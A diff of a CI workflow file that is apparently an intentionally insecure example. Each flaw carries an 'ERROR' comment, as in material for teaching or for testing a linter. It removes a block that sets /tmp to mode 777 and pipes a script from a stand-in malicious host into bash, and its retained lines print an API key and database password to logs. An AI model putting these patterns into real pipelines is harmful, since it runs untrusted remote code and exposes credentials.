@@ -167,12 +167,6 @@ jobs:
           echo "API Key: $API_KEY"  # ERROR: Logging secrets
           echo "DB Password: $DATABASE_PASSWORD"  # ERROR: Logging secrets
           
-      # ERROR: Running commands with elevated privileges unnecessarily
-      - name: Dangerous commands
-        run: |
-          sudo chmod 777 /tmp  # ERROR: Overly permissive permissions
-          curl -sSL http://malicious-site.com/script.sh | bash  # ERROR: Executing untrusted code
-          
       # ERROR: No input validation
       - name: Unvalidated input
         run: |
